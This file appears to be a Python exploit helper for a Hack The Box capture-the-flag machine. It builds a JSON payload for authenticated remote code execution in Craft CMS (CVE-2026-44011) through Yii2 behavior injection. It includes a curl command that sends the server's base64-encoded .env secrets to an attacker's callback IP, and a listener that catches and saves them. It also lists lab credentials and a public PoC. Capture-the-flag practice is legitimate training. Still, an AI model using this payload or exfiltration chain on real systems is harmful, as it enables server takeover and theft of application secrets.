#!/usr/bin/env python3
"""
HTB Layover - Phase 3: Craft CMS authenticated RCE (CVE-2026-44011)
Yii2 behavior injection via /admin/actions/element-search/search.

This script does NOT implement the full login flow (the public PoC does that
better). It:
  1. prints the exact JSON payload to paste into the browser/curl, and
  2. starts a tiny HTTP listener that catches the exfiltrated base64 .env.

Recommended: use the maintained PoC instead
    git clone https://github.com/khush-613/cve-2026-44011-poc
    python3 exploit.py -b http://portal.international.htb \
        -u jenny -p 'Fl1ghtDeck2026!' -c 'id' -H <YOUR_10.13.37_IP>

Manual usage:
    python3 03_craft_rce.py listen --port 9999
    # then send the printed payload (logged in as jenny) and read the .env

Affected: Craft CMS 5.0.0-5.9.17 (and 4.0.0-4.17.11); fixed 5.9.18 / 4.17.12.
Box runs 5.9.8 -> vulnerable.
"""
import argparse
import base64
import json
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer


def build_payload(cmd: str, site_id: int = 1,
                  element_type: str = "craft\\elements\\Category") -> dict:
    """FieldLayout condition whose 'as <behavior>' key attaches
    AttributeTypecastBehavior calling ConsoleProcessus::execute(cmd)."""
    return {
        "elementType": element_type,
        "siteId": site_id,
        "search": "",
        "condition": {
            "class": "craft\\elements\\conditions\\ElementCondition",
            "elementType": element_type,
            "fieldLayouts": [{
                "as rce": {
                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                    "__construct()": [{
                        "attributeTypes": {
                            "typecastAfterValidate": [
                                "Psy\\Readline\\Hoa\\ConsoleProcessus", "execute"
                            ]
                        },
                        "typecastAfterValidate": ["sh", "-c", cmd],
                    }],
                },
                "on *": "self::beforeSave",
            }],
        },
    }


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode(errors="replace")
        dec = ""
        try:
            dec = base64.b64decode(body).decode(errors="replace")
        except Exception:
            dec = "(not valid base64)"
        print("\n" + "=" * 60)
        print("[+] CALLBACK from %s" % self.client_address[0])
        print("[+] raw : %s" % body[:400])
        print("[+] decoded .env:\n%s" % dec)
        print("=" * 60)
        with open("/tmp/layover_env.txt", "w") as f:
            f.write(dec)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


def main() -> None:
    ap = argparse.ArgumentParser(description="Craft CMS behavior-injection RCE helper")
    sub = ap.add_subparsers(dest="action", required=True)

    p = sub.add_parser("payload", help="print the JSON payload")
    p.add_argument("--cmd", default="id")
    p.add_argument("--callback-ip", required=False)
    p.add_argument("--callback-port", default="9999")
    p.add_argument("--site-id", type=int, default=1)

    l = sub.add_parser("listen", help="start the exfil listener")
    l.add_argument("--bind", default="0.0.0.0")
    l.add_argument("--port", type=int, default=9999)

    a = ap.parse_args()

    if a.action == "payload":
        cmd = a.cmd
        if a.callback_ip:
            cmd = ("curl http://%s:%s/$(cat /var/www/portal/.env | base64 -w0)"
                   % (a.callback_ip, a.callback_port))
        print(json.dumps(build_payload(cmd, a.site_id), indent=2))
        print("\n# POST this as the 'condition'/'fieldLayouts' body to:", file=sys.stderr)
        print("#   POST /admin/actions/element-search/search", file=sys.stderr)
        print("# (needs a valid Craft session cookie + CSRF token as 'jenny')", file=sys.stderr)
        return

    print("[*] listening on %s:%d  (waiting for .env callback)" % (a.bind, a.port))
    HTTPServer((a.bind, a.port), Handler).serve_forever()


if __name__ == "__main__":
    main()
